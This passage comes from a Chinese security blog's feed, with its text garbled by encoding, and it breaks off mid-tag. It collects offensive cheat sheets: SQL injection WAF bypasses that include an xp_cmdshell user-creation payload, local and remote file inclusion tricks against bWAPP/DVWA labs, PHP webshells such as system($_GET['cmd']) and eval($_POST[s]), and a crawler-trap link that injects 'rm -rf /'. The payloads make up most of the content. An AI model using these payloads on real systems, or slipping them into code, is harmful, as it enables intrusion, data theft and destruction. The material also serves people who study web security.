<h1 id="0x04-é«˜çº§ç»•è¿‡"><a href="#0x04-é«˜çº§ç»•è¿‡" class="headerlink" title="0x04 é«˜çº§ç»•è¿‡"></a>0x04 é«˜çº§ç»•è¿‡</h1><h2 id="1-HPPï¼ˆhttpå‚æ•°æ±¡æŸ“"><a href="#1-HPPï¼ˆhttpå‚æ•°æ±¡æŸ“" class="headerlink" title="1.HPPï¼ˆhttpå‚æ•°æ±¡æŸ“)"></a>1.HPPï¼ˆhttpå‚æ•°æ±¡æŸ“)</h2><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>index.php?par1=val1&amp;par1=val2<br>| web server | par1 |<br>| :â€” | :â€” |<br>| ASP.NET/IIS | val1,val2 |<br>| ASP/IIS | val1,val2 |<br>| PHP/Apache | val2 |<br>| JSP/Tomcat | val1 |<br>eg:<br>åœ¨<code>ASP/ASP.NET</code>çš„ç¯å¢ƒä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Forbidden: http://localhost/search.aspx?q=select name,password from users</div><div class="line">Bypassed : http://localhost/search.aspx?q=select name&amp;q=password from users</div><div class="line">Bypassed : http://localhost/search.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/users</div><div class="line">Bypassed : http://localhost/news.aspx?id=1&apos;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell /*&amp;id=1*/ net user test test /*&amp;id=1*/ --</div></pre></td></tr></table></figure></p>
<h2 id="2-HPC-httpå‚æ•°æ±¡æŸ“"><a href="#2-HPC-httpå‚æ•°æ±¡æŸ“" class="headerlink" title="2.HPC(httpå‚æ•°æ±¡æŸ“)"></a>2.HPC(httpå‚æ•°æ±¡æŸ“)</h2><p>RFC2396å®šä¹‰äº†å¦‚ä¸‹ä¸€äº›å­—ç¬¦ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &apos; ()</div><div class="line">Reserved : ; / ? : @ &amp; = + $ ,</div><div class="line">Unwise : &#123; &#125; | \ ^ [ ] `</div></pre></td></tr></table></figure></p>
<p>ä¸åŒçš„WebæœåŠ¡å™¨å¤„ç†å¤„ç†æ„é€ å¾—ç‰¹æ®Šè¯·æ±‚æ—¶æœ‰ä¸åŒçš„é€»è¾‘ï¼š<br>| Query String | Apache/2.2.16,PHP/5.3.3 | IIS6/ASP |<br>| :â€” | :â€” | :â€” |<br>| ?test[1=2 | test_1=2 | test[1=2 |<br>| ?test=% | test=% | test= |<br>| ?test%00=1 | test= | test=1 |<br>| ?test=1%001 | NULL | test=1 |<br>| ?test+d=1+2 | test_d=1 2 | test d=1 2 |<br>eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Forbidden: http://localhost/?xp_cmdshell</div><div class="line">Bypassed : http://localhost/?xp[cmdshell</div><div class="line">Forbidden: http://localhost/test.asp?file=../flag.txt</div><div class="line">Bypassed : http://localhost/test.asp?file=.%./flag.txt</div><div class="line">Forbidden: http://localhost/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables)</div><div class="line">Bypassed : http://localhost/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ–‡ä»¶åŒ…å«-Tips]]></title>
      <url>/2017/03/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-Tips/</url>
      <content type="html"><![CDATA[<p>å­¦æ ¡è¦æä¸ªè¯‘æ–‡(çœŸç‰¹ä¹ˆä¸æ˜ç™½æœ‰ä»€ä¹ˆåµç”¨â€¦)ï¼Œç„¶åå°±æ‰¾äº†å‡ ç¯‡å¤–å›½æ¯”è¾ƒå¥½çš„æ–‡ç« ï¼Œè¶ç€ä¹Ÿæ¶¨ç‚¹å§¿åŠ¿ã€‚<br><a id="more"></a></p>
<h1 id="åŸºæœ¬çš„æ–‡ä»¶åŒ…å«æ”»å‡»"><a href="#åŸºæœ¬çš„æ–‡ä»¶åŒ…å«æ”»å‡»" class="headerlink" title="åŸºæœ¬çš„æ–‡ä»¶åŒ…å«æ”»å‡»"></a>åŸºæœ¬çš„æ–‡ä»¶åŒ…å«æ”»å‡»</h1><p>ä¸å¤šè¯´ï¼Œéƒ½æ‡‚</p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into 192.168.1.11/bWAPP/flfi.php?language=<a href="http://192.168.1.11/shell.php" target="_blank" rel="external">http://192.168.1.11/shell.php</a></p>
</blockquote>
<h1 id="æ‰©å±•çš„æ–‡ä»¶åŒ…å«æ”»å‡»"><a href="#æ‰©å±•çš„æ–‡ä»¶åŒ…å«æ”»å‡»" class="headerlink" title="æ‰©å±•çš„æ–‡ä»¶åŒ…å«æ”»å‡»"></a>æ‰©å±•çš„æ–‡ä»¶åŒ…å«æ”»å‡»</h1><p>åŠ äº†ä¸ª<code>?</code>ä¸æ˜¯å¾ˆæ˜ç™½æ˜¯ä»€ä¹ˆåŸå› ï¼Œæˆ‘è§‰å¾—æ˜¯<strong>æˆªæ–­</strong>ã€‚</p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into192.168.1.11/bWAPP/flfi.php? language=<a href="http://192.168.1.11/shell.php?" target="_blank" rel="external">http://192.168.1.11/shell.php?</a></p>
</blockquote>
<h1 id="ç©ºå­—èŠ‚æˆªæ–­"><a href="#ç©ºå­—èŠ‚æˆªæ–­" class="headerlink" title="ç©ºå­—èŠ‚æˆªæ–­"></a>ç©ºå­—èŠ‚æˆªæ–­</h1><p><code>%00</code>éƒ½æ˜¯è€å¥—è·¯</p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into 192.168.1.11/bWAPP/flfi.php?language=<a href="http://192.168.1.11/shell.php%00" target="_blank" rel="external">http://192.168.1.11/shell.php%00</a></p>
</blockquote>
<h1 id="æ›´æ”¹HTTP"><a href="#æ›´æ”¹HTTP" class="headerlink" title="æ›´æ”¹HTTP"></a>æ›´æ”¹HTTP</h1><blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into192.168.1.11/bWAPP/flfi.phï¼Ÿlanguage = <strong>HTTP</strong>ï¼š//192.168.1.11/shell.php</p>
</blockquote>
<h1 id="æ›´æ”¹å›¾åƒæ‰©å±•å"><a href="#æ›´æ”¹å›¾åƒæ‰©å±•å" class="headerlink" title="æ›´æ”¹å›¾åƒæ‰©å±•å"></a>æ›´æ”¹å›¾åƒæ‰©å±•å</h1><p>ä¸çŸ¥é“è€å¤–ä¸ºå•¥è¿™æ ·è¯´ï¼Œæˆ‘è§‰å¾—æ˜¯æ–‡ä»¶ä¼ªè£…å•Š</p>
<p>ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ–‡ä»¶å¤´æ·»åŠ <code>GIF89a</code>ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶åç¼€ä¸º<code>shell.gif</code></p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into192.168.1.11/bWAPP/flfi.ph?language=httpï¼š//192.168.1.11/shell.gif</p>
</blockquote>
<h1 id="é»‘åå•æ”»å‡»"><a href="#é»‘åå•æ”»å‡»" class="headerlink" title="é»‘åå•æ”»å‡»"></a>é»‘åå•æ”»å‡»</h1><p>ä¿®æ”¹å¤§å°å†™å•¦ï¼Œä¿®æ”¹åç¼€å•¦ï¼Œè§£ææ¼æ´å•¦ï¼Œæ¯”å¦‚<code>.PHP</code>,<code>.php3</code>,<code>.asa</code>,<code>.cer</code>è¿™äº›å•¦ç­‰ç­‰ã€‚</p>
<blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into192.168.1.11/bWAPP/flfi.php?language=<a href="http://192.168.1.11/shell.PHP" target="_blank" rel="external">http://192.168.1.11/shell.PHP</a></p>
</blockquote>
<h1 id="Base64ç¼–ç "><a href="#Base64ç¼–ç " class="headerlink" title="Base64ç¼–ç "></a>Base64ç¼–ç </h1><blockquote>
<p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=</a> php://filter/read=convert.base64-encode-resource=<a href="http://192.168.1.11/shell.php" target="_blank" rel="external">http://192.168.1.11/shell.php</a></p>
</blockquote>
<p>æåˆ°æœ€åè€å¤–è‡ªå·±è¿˜æ¥ä¸ª<strong>å‰å®³äº†ï¼ï¼ï¼</strong>,æŠŠæˆ‘å½“æ—¶æ•´è’™è”½äº†ã€‚ã€‚</p>
<h1 id="PHP-inputè¾“å…¥æµ"><a href="#PHP-inputè¾“å…¥æµ" class="headerlink" title="PHP inputè¾“å…¥æµ"></a>PHP inputè¾“å…¥æµ</h1><p>å¥—è·¯â€¦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=ls</div><div class="line">POST:</div><div class="line">&lt;?php system($_GET[&apos;cmd&apos;]);?&gt;</div></pre></td></tr></table></figure></p>
<h1 id="Proc-self-environ"><a href="#Proc-self-environ" class="headerlink" title="Proc/self/environ"></a>Proc/self/environ</h1><p>è¿™ä¸ªæœ‰å¾ˆå¤šç§çš„ï¼Œä¸é™äºè¿™ä¸ªæ—¥å¿—ï¼Œæ¯”å¦‚<code>access.log</code>,<code>error_log</code>ç­‰å„ç§æ—¥å¿—æ–‡ä»¶ã€‚</p>
<p>é€šè¿‡åŒ…å«User-Agentçš„proc/self/environæ–‡ä»¶æ¥åˆ©ç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-Agent: &lt;?php system($_GET[&apos;cmd&apos;]);?&gt;</div><div class="line">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ&amp;cmd=id</div></pre></td></tr></table></figure></p>
<h1 id="PHPæ–‡ä»¶åŒ…å«"><a href="#PHPæ–‡ä»¶åŒ…å«" class="headerlink" title="PHPæ–‡ä»¶åŒ…å«"></a>PHPæ–‡ä»¶åŒ…å«</h1><p>è‡ªå·±çš„å°æ¦‚è¿°</p>
<h2 id="åŸºæœ¬çš„æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#åŸºæœ¬çš„æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="åŸºæœ¬çš„æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>åŸºæœ¬çš„æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><p><code>&lt;?php include(â€œinc/â€ .$_GET[â€˜fileâ€™]);?&gt;</code><br>åŒ…å«æ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹ï¼š<br><code>?file=.htaccess</code><br>ç›®å½•éå†ï¼š<br><code>ï¼Ÿfile=../../../../../../../../var/lib/locate.db</code><br>åŒ…å«æ³¨å…¥çš„PHPä»£ç ï¼š<br><code>ï¼Ÿfile=../../../../../../../var/log/apache/error.log</code><br>ä¸€äº›æŠ€å·§ï¼š</p>
<ol>
<li>å¯èƒ½çš„Apacheç›®å½•åˆ—è¡¨</li>
<li>åŒ…å«è®¿é—®æ—¥å¿—ï¼Œæ¯”å¦‚/proc/self/fd/X</li>
<li>åŒ…å«æ¥æ‹¥æœ‰æ›´å¤šä¿¡æ¯çš„procæ–‡ä»¶ç³»ç»Ÿ</li>
<li>åŒ…å«ç”µå­é‚®ä»¶çš„æ—¥å¿—æ–‡ä»¶</li>
<li>åŒ…å«sshçš„è®¤è¯æ—¥å¿—æ–‡ä»¶ auth.log</li>
<li>å°½å¯èƒ½å¤šçš„å°è¯•å¤´åƒ/å›¾ç‰‡/é™„ä»¶æ–‡ä»¶ä¸Šä¼ </li>
<li>åŒ…å«ä¼šè¯æ–‡ä»¶</li>
<li>åŒ…å«PHPçš„ä¸´æ—¶ä¸Šä¼ æ–‡ä»¶ï¼ˆå¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼‰<br>å¦‚æœä½ æœ‰ä¸€ä¸ªphpinfo()ï¼Œè¯·å‚è€ƒæˆ‘ä»¬Dropsçš„æ–‡ç« <a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">LFI with PHPInfoæœ¬åœ°æµ‹è¯•è¿‡ç¨‹</a>ã€‚</li>
</ol>
<h2 id="æœ‰é™åˆ¶çš„æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ‰é™åˆ¶çš„æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ‰é™åˆ¶çš„æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ‰é™åˆ¶çš„æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><p><code>&lt;?php include(â€˜inc/â€™. $_GET[â€˜fileâ€™] . â€œ.htmâ€); ?&gt;</code><br>ç©ºå­—èŠ‚æ³¨å…¥ï¼š<br><code>?file=../../../../../../../../etc/passwd%00</code><br>ï¼ˆéœ€è¦phpé…ç½®å…³é—­magic_quotes_gpcï¼‰<br>ç©ºå­—èŠ‚æ³¨å…¥ç›®å½•åˆ—è¡¨ï¼š<br><code>?file=../../../../../../../var/www/accounts/%00</code><br>ï¼ˆä»…é™äºUFSç³»ç»Ÿä¸­ï¼Œå¹¶ä¸”éœ€è¦å…³é—­magic_quotes_gpcï¼‰<br>è·¯å¾„æˆªæ–­ï¼š<br><code>?file=../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\...</code><br>ç‚¹æˆªæ–­ï¼š<br><code>?file=../../../../../../etc/passwdâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</code><br>ï¼ˆä»…é™äºwindowsç³»ç»Ÿä¸­ï¼‰<br>åå‘è·¯å¾„æˆªæ–­ï¼š<br><code>?file=../../../../[..]../../../etc/passwd</code></p>
<h2 id="åŸºæœ¬çš„è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#åŸºæœ¬çš„è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="åŸºæœ¬çš„è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>åŸºæœ¬çš„è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p><code>&lt;?php include($_GET[â€˜fileâ€™]); ?&gt;</code><br>åŒ…å«è¿œç¨‹ä»£ç ï¼š<br><code>?file=[http|https|ftp]://websec.wordpress.com/shell.txt</code><br>ï¼ˆéœ€è¦<code>allow_url_fopen</code>ã€å’Œ<code>allow_url_include</code>å¼€å¯ï¼‰<br>ä½¿ç”¨phpï¼šinputè¾“å…¥æµï¼š<br><code>?file=php://input</code><br>ï¼ˆåœ¨POSTå‚æ•°ä¸­è®¾ç½®ä½ çš„æ”»å‡»è½½è·ï¼Œæ³¨æ„<code>urlencoding</code>ï¼Œå¹¶ä¸”éœ€è¦<code>allow_url_include</code>å¼€å¯ï¼‰<br>ä½¿ç”¨URIsæ•°æ®ï¼š<br><code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code><br>ï¼ˆéœ€è¦<code>allow_url_include</code>å¼€å¯ï¼‰<br>ä½¿ç”¨XSSï¼š<br><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode</code><br>ï¼ˆåªæœ‰åœ¨é˜²ç«å¢™æˆ–åœ¨ç™½åå•å†…çš„åŸŸåæ‰æœ‰æ•ˆï¼‰</p>
<h2 id="æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>æœ‰é™åˆ¶çš„è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p><code>&lt;?php include($_GET[â€˜fileâ€™] . â€œhtmâ€); ?&gt;</code><br><code>file=https://websec.wordpress.com/shell</code><br><code>?file=https://websec.wordpress.com/shell.txt?</code><br><code>?file=https://websec.wordpress.com/shell.txt%23</code><br>ï¼ˆéœ€è¦<code>allow_url_fopen</code>ï¼Œ<code>allow_url_include</code>å¼€å¯ï¼‰<br><code>?file=\\evilshare\shell.php</code><br>ï¼ˆç»•è¿‡<code>allow_url_fopen</code>å…³é—­çš„æƒ…å†µä¸‹ï¼‰<br>è¿‡æ»¤å™¨é€ƒé€¸ï¼š<br>è®¿é—®å¸¦é€šé…ç¬¦çš„æ–‡ä»¶ï¼š</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> PHP </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å…³äºåçˆ¬è™«çš„ä¸€ä¸ªæ€è€ƒ]]></title>
      <url>/2017/03/05/%E5%85%B3%E4%BA%8E%E5%8F%8D%E7%88%AC%E8%99%AB%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%9D%E8%80%83/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å¼€å‘ä¸€ä¸ªPythonçš„ç³»ç»Ÿï¼Œåœ¨å†™çˆ¬è™«çš„æ—¶å€™çªç„¶æƒ³åˆ°ä¸€ä¸ªç‰¹åˆ«çŒ¥ççš„å¯¹ä»˜ä½¿ç”¨è„šæœ¬è¿›è¡Œæ‰¹é‡æ£€æµ‹çš„ä¸€ä¸ªå°æ–¹æ³•ã€‚<br><a id="more"></a><br>æˆ‘ä»¬åœ¨è¿›è¡Œæ‰¹é‡æ‰«æå¹¶æ£€æµ‹çš„æ—¶å€™ï¼Œéƒ½å¯èƒ½ä¼šè°ƒç”¨ä¸€äº›ç³»ç»Ÿå‘½ä»¤ï¼Œæ¯”å¦‚å¦‚ä¸‹ä»£ç :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">for i in get_new_urls:</div><div class="line">    os.system(&quot;python sqlmap.py -u %s&quot; % i)</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>ä»¥ä¸Šä»£ç ï¼Œå¦‚æœæˆ‘ä»¬ç½‘ç«™çš„urlé‡Œæœ‰ä¸‹é¢çš„ä¸€ä¸ªé“¾æ¥ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;https://www.baidu.com | rm -rf / &quot;&gt;</div></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆè„šæœ¬æœ€åæ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">os.system(&quot;python sqlmap.py -u https://www.baidu.com | rm -rf /&quot;)</div></pre></td></tr></table></figure></p>
<p>â€¦</p>
<p>æ‰€ä»¥ä½ æ‡‚çš„â€¦</p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP&XSSçš„ä¸€äº›å°tips]]></title>
      <url>/2017/03/04/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B-XSS%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftips/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘æœé›†çš„ä¸€äº›ï¼ŒPHPè¿‡waf webshell,å¼±ç±»å‹ï¼Œopen<em>basedirï¼ŒXSSç»•è¿‡çš„ä¸€äº›å°tipsï¼Œæ¬¢è¿å¤§ç‰›çº é”™ã€‚-\</em>-<br><a id="more"></a></p>
<h1 id="æ— å­—æ¯æ•°å­—webshellæ„é€ "><a href="#æ— å­—æ¯æ•°å­—webshellæ„é€ " class="headerlink" title="æ— å­—æ¯æ•°å­—webshellæ„é€ "></a>æ— å­—æ¯æ•°å­—webshellæ„é€ </h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">PHP TRUE == 1 FALSE == 0 TRUE + TRUE == 2 </div><div class="line">å¼‚æˆ–ï¼š&apos; ! &apos;^&apos; ` &apos; == &apos;A&apos;</div><div class="line">å–åï¼š~(&apos;å’Œ&apos;&#123;2&#125;) == &apos;s&apos;</div><div class="line">PHP è‡ªå¢ï¼šä»…å…è®¸å­—æ¯å­—ç¬¦è‡ªå¢</div><div class="line">&apos;a&apos;++ == &apos;b&apos;;</div><div class="line">&apos;z&apos;++ == &apos;aa&apos;;</div><div class="line">php 5.3</div><div class="line">&apos; &apos;.[] == &apos;Array&apos;</div><div class="line">&apos;Array&apos;&#123;0&#125; === &apos;A&apos;</div><div class="line">&apos;Array&apos;&#123;3&#125; === &apos;a&apos;</div><div class="line">&apos; &apos; == 0</div><div class="line">$_=&apos; &apos;.[]; $_&#123;&apos; &apos;&#125;===&apos;A&apos;;</div></pre></td></tr></table></figure>
<h1 id="æ¸—é€æµ‹è¯•å°tips"><a href="#æ¸—é€æµ‹è¯•å°tips" class="headerlink" title="æ¸—é€æµ‹è¯•å°tips"></a>æ¸—é€æµ‹è¯•å°tips</h1><ul>
<li>é­”æœ¯å¼•å·ä¸è¿‡æ»¤<code>$_SERVER[]</code>å­—æ®µï¼Œé€ æˆæ³¨å…¥</li>
<li><p>mysqlçš„ç±»å‹å¼ºåˆ¶è½¬æ¢å¯ç»•è¿‡PHPä¸­<code>empty()</code>å‡½æ•°å¯¹0çš„falseè¿”å›</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">æäº¤/?test=0axxx    -&gt; empty($_GET[&apos;test&apos;]) =&gt; è¿”å›çœŸ</div></pre></td></tr></table></figure>
</li>
<li><p>å½“å¯æ§å˜é‡è¿›å…¥åŒå¼•å·ä¸­æ—¶å¯å½¢æˆwebshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a = &quot;$&#123;@eval($_POST[s])&#125;&quot;;</div><div class="line">$a = &quot;$&#123;$&#123;eval($_POST[s])&#125;&#125;&quot;;</div></pre></td></tr></table></figure>
</li>
<li><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·çš„æ³¨å…¥ï¼Œå¯ä½¿ç”¨æ‹¬å·åŒ…è£¹ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select(location)from(website);</div><div class="line">select&#123;x(name)&#125;from&#123;x(manager)&#125;;</div></pre></td></tr></table></figure>
</li>
<li><p>ç”±äºPHPå¼±ç±»å‹éªŒè¯æœºåˆ¶ï¼Œå¯¼è‡´<code>==</code>ã€<code>in_array()</code>ç­‰å¯é€šè¿‡å¼ºåˆ¶è½¬æ¢ç»•è¿‡éªŒè¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">in_array($_GET[&apos;x&apos;],array(1,2,3,4,5))</div><div class="line">è®¿é—®?test=â€™1â€™testtestå¯åˆ¤æ–­æˆåŠŸ</div></pre></td></tr></table></figure>
</li>
<li><p>windowsç‰¹æ€§</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">windowsä¸‹phpä¸­è®¿é—®æ–‡ä»¶åä½¿ç”¨â€&lt;â€ â€œ&gt;â€å°†ä¼šè¢«æ›¿æ¢æˆâ€*â€ â€œ?â€ï¼Œåˆ†åˆ«ä»£è¡¨Nä¸ªä»»æ„å­—ç¬¦ä¸1ä¸ªä»»æ„å­—ç¬¦</div></pre></td></tr></table></figure>
</li>
<li><p>å˜é‡è¦†ç›–</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$GLOBALS,$_SERVER,$_GET,$_POST,$_COOKIE,$_REQUEST,$_FILES,$_ENV,$_SESSION</div><div class="line">parse_str(),mb_parse_str(),import_request_variables(),extract()</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="PHPçš„å¼ºåˆ¶ç±»å‹è½¬æ¢çš„åŸåˆ™"><a href="#PHPçš„å¼ºåˆ¶ç±»å‹è½¬æ¢çš„åŸåˆ™" class="headerlink" title="PHPçš„å¼ºåˆ¶ç±»å‹è½¬æ¢çš„åŸåˆ™"></a>PHPçš„å¼ºåˆ¶ç±»å‹è½¬æ¢çš„åŸåˆ™</h1><ol>
<li>å¯¹äºæ•°å­¦è¿ç®—ï¼Œå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å€¼</li>
<li>å¯¹äºå­—ç¬¦ä¸²è¿ç®—ï¼Œæ•°å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²<h1 id="PHPå¼±ç±»å‹"><a href="#PHPå¼±ç±»å‹" class="headerlink" title="PHPå¼±ç±»å‹"></a>PHPå¼±ç±»å‹</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">== åªæ£€æŸ¥å€¼ï¼Œä¸æ£€æŸ¥ç±»å‹</div><div class="line">=== æ—¢æ£€æŸ¥å€¼ï¼Œåˆæ£€æŸ¥ç±»å‹</div><div class="line">NULL,0,â€0â€,array()ä½¿ç”¨==å’Œfalseæ¯”è¾ƒæ—¶ï¼Œéƒ½æ˜¯ä¼šè¿”å›trueçš„ï¼Œè€Œä½¿ç”¨===å´ä¸ä¼š</div><div class="line">123abc == 123 â€”&gt; true</div><div class="line">0 == &apos;abc&apos; â€”&gt; true</div><div class="line">&apos;0e132456789&apos;==&apos;0e7124511451155&apos; â€”&gt;true</div><div class="line">240610708ã€QNKCDZOã€aabg7XSsã€aabC9RqSçš„MD5ç›¸åŒ</div><div class="line"></div><div class="line">intval()å‡½æ•°ï¼šstringè½¬int</div><div class="line">intval(&apos;0x1e240&apos;)==&apos;123456&apos; //true</div><div class="line">intval(&apos;0x1e240&apos;)==123456 //true</div><div class="line">intval(&apos;0x1e240&apos;)==&apos;1e240&apos; //false</div><div class="line">å½“å…¶ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯0xå¼€å¤´çš„æ—¶å€™ï¼Œoxå¼€å¤´è¡¨ç¤º16è¿›åˆ¶ï¼ŒPHPä¼šå°†æ­¤å­—ç¬¦ä¸²è§£ææˆä¸ºåè¿›åˆ¶ç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼Œ</div><div class="line">0Ã—1e240è§£ææˆä¸ºåè¿›åˆ¶å°±æ˜¯123456ï¼Œæ‰€ä»¥ä¸intç±»å‹å’Œstringç±»å‹çš„123456æ¯”è¾ƒéƒ½æ˜¯ç›¸ç­‰</div><div class="line"></div><div 